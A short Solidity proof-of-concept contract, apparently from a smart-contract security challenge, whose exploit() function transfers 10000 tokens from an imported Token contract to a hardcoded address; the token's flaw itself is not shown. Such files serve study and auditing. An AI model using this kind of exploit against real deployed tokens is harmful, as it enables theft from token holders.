// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./token.sol";

contract TokenPOC {
    Token token;

    constructor(address _token) {
        token = Token(_token);
    }

    function exploit() external {
        token.transfer(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B, 10000);
    }
}